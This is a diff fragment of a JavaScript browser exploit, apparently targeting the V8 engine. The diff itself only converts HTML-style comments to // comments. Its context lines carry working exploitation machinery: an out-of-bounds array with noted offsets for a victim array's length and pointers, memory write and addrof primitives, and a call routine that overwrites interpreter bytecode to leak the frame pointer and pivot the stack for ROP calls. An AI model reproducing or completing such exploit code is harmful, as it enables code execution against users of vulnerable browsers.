@@ -107,18 +107,18 @@
                 gc();
                 map1.set(0x0, 0x1);
                 
-                <!-- for (let i = 0; i < 200; i++) { -->
-                    <!-- await log('oob_arr[' + i + '] : 0x' + toHex(oob_arr[i])); -->
-                <!-- } -->
+                //for (let i = 0; i < 200; i++) {
+                    //await log('oob_arr[' + i + '] : 0x' + toHex(oob_arr[i]));
+                //}
                 
                 //oob_arr[31] : 0x2 -- victim_arr length
                 //oob_arr[32] : 0xf -- victim_arr ExternalPointer_t 
                 //oob_arr[33] : 0x27e8412d1 -- victm_arr base_pointer
                 
-                <!-- obj_arr[0] = 0x1n; -->
-                <!-- for (let i = 0; i < 200; i++) { -->
-                    <!-- await log('oob_arr[' + i + '] : 0x' + toHex(oob_arr[i])); -->
-                <!-- } -->
+                //obj_arr[0] = 0x1n;
+                //for (let i = 0; i < 200; i++) {
+                    //await log('oob_arr[' + i + '] : 0x' + toHex(oob_arr[i]));
+                //}
                 
                 const oob_arr_before = [];
                 for (let i = 0; i < 100; i++) {
@@ -365,9 +365,9 @@
                 
                 function call(address, arg1 = 0x0n, arg2 = 0x0n, arg3 = 0x0n, arg4 = 0x0n, arg5 = 0x0n, arg6 = 0x0n) {
                     // Step 1: Set bytecode to leak frame pointer
-                    <!-- write8(bc_start, 0x25);      // Ldar -->
-                    <!-- write8(bc_start + 1n, 0x0);  // offset 0 (load saved rbp from stack) -->
-                    <!-- write8(bc_start + 2n, 0xAB); // Return -->
+                    //write8(bc_start, 0x25);      // Ldar
+                    //write8(bc_start + 1n, 0x0);  // offset 0 (load saved rbp from stack)
+                    //write8(bc_start + 2n, 0xAB); // Return
                     
                     // optimization
                     write64(bc_start, 0xAB0025n);
@@ -376,11 +376,11 @@
                     saved_fp = addrof(call_rop(address, 0x0n, arg1, arg2, arg3, arg4, arg5, arg6)) + 0x1n;
                     
                     // Step 2: Update bytecode to pivot stack
-                    <!-- write8(bc_start, 0x25);      // Ldar a0 (load fake_frame object addr) -->
-                    <!-- write8(bc_start + 1n, 0x3); -->
-                    <!-- write8(bc_start + 2n, 0x26);  // Star fp (store to frame pointer) -->
-                    <!-- write8(bc_start + 3n, 0x0); -->
-                    <!-- write8(bc_start + 4n, 0xAB);  // Return -->
+                    //write8(bc_start, 0x25);      // Ldar a0 (load fake_frame object addr)
+                    //write8(bc_start + 1n, 0x3);
+                    //write8(bc_start + 2n, 0x26);
+                    //write8(bc_start + 3n, 0x0);
+                    //write8(bc_start + 4n, 0xAB);  // Return
                     
                     // optimization
                     write64(bc_start, 0xAB00260325n);
